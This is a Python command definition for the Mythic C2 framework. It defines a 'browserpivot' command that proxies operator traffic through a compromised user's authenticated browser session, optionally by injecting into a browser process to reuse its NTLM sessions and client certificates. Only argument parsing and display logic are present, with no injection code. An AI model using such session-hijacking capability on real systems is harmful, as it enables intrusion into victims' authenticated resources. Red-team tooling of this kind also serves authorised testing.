from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class BrowserpivotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["start", "stop"],
                default_value="start",
                description="Start or stop the browser pivot proxy",
            ),
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                default_value=0,
                description="Browser process PID to inject into (0 = use agent's own WinINet session)",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="port",
                type=ParameterType.Number,
                default_value=8080,
                description="Local port for the HTTP proxy listener",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except Exception:
                parts = self.command_line.strip().split()
                if len(parts) >= 1:
                    self.add_arg("action", parts[0])
                if len(parts) >= 2:
                    self.add_arg("pid", int(parts[1]))
                if len(parts) >= 3:
                    self.add_arg("port", int(parts[2]))


class BrowserpivotCommand(CommandBase):
    cmd = "browserpivot"
    needs_admin = False
    help_cmd = "browserpivot start [pid] [port]"
    description = (
        "Start a local HTTP proxy that uses WinINet to forward requests through the "
        "user's authenticated browser session (cookies, Kerberos, proxy settings). "
        "When pid=0 (default), uses the agent process's WinINet session. "
        "When a browser PID is specified, injects into that process to inherit its "
        "NTLM sessions and client certificates. "
        "Combine with SOCKS to proxy operator traffic through the pivot."
    )
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1557.001"]
    argument_class = BrowserpivotArguments
    attributes = CommandAttributes(builtin=False)

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        action = taskData.args.get_arg("action")
        pid = taskData.args.get_arg("pid")
        port = taskData.args.get_arg("port")
        if action == "start":
            if pid and pid > 0:
                response.DisplayParams = f"start (inject PID {pid}) on port {port}"
            else:
                response.DisplayParams = f"start (local WinINet) on port {port}"
        else:
            response.DisplayParams = "stop"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
